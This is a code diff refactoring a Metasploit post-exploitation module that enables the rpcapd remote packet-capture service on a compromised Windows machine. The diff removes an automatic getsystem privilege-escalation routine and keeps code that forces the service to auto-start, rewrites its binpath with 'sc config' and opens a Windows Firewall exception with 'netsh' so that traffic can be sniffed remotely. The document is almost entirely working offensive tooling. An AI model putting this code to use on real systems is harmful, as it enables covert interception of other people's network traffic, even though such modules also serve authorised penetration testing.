@@ -39,15 +39,13 @@ class Metasploit3 < Msf::Post
 			[
 				OptBool.new('NULLAUTH', [ true, 'Enable Null Authentication.', true]),
 				OptBool.new('ACTIVE',   [ true, 'Enable rpcapd in active mode (passive by default).', false]),
-				OptBool.new('GETSYSTEM',   [ true,  'Try to get System privilege.', true]),
 				OptAddress.new('RHOST',	 [ false, 'Remote host to connect (set in active mode only).']),
 				OptInt.new('PORT',    [ true,  'Local/Remote port to capture traffic.',2002])
 			], self.class)
 	end
 
 	def run
-		#Check platform to avoid problems with getsystem (e.g. java/java)
-		if check_perm and client.platform =~ /win32|win64/i
+		if is_admin?
 			serv = service_info("rpcapd")
 			print_status("Checking if machine #{sysinfo['Computer']} has rpcapd service")
 
@@ -56,7 +54,7 @@ class Metasploit3 < Msf::Post
 			else
 				print_status("Rpcap service found: #{serv['Name']}")
 				reg=registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\rpcapd","Start")
-				prog=client.fs.file.expand_path("%ProgramFiles%") << "\\winpcap\\rpcapd.exe"
+				prog=expand_path("%ProgramFiles%") << "\\winpcap\\rpcapd.exe"
 				if reg != 2
 					print_status("Setting rpcapd as 'auto' service")
 					service_change_startup("rpcapd","auto")
@@ -76,31 +74,13 @@ class Metasploit3 < Msf::Post
 				run_rpcapd(p)
 			end
 		else
-			print_error("You don't have enough privileges.")
-		end
-	end
-
-	def check_perm
-		if !is_admin? and datastore['GETSYSTEM']==true
-			print_status("Trying to get System privileges...")
-				s = session.priv.getsystem
-				if s[0]
-					print_good("Got System")
-					return true
-				else
-					print_error("Couldn't get System")
-					return false
-				end
-		elsif !is_admin? and datastore['GETSYSTEM']==false
-			return false
-		else 			# is_admin? = true
-			return true
+			print_error("You don't have enough privileges. Try getsystem.")
 		end
 	end
 
 	def run_rpcapd(p)
 		begin
-			client.sys.process.execute("cmd.exe /c sc config rpcapd binpath= \"#{p}\" ",nil, {'Hidden' => 'true', 'Channelized' => true})
+			cmd_exec("sc","config rpcapd binpath= \"#{p}\" ",30)
 			result=service_start("rpcapd")
 			case result
 				when 0
@@ -121,8 +101,8 @@ class Metasploit3 < Msf::Post
 	def fw_enable(prog)
 		print_status ("Enabling rpcapd.exe in Windows Firewall")
 		begin
-			if (client.fs.file.exists?(prog))
-				client.sys.process.execute("cmd.exe /c netsh firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE", nil, {'Hidden' => 'true', 'Channelized' => true})
+			if file_exist?(prog)
+				cmd_exec("netsh","firewall add allowedprogram \"#{prog}\" \"Windows Service\" ENABLE ",30)
 			else
 				print_error("rpcad.exe doesn't exist in #{prog}. Check the installation of WinPcap")
 			end
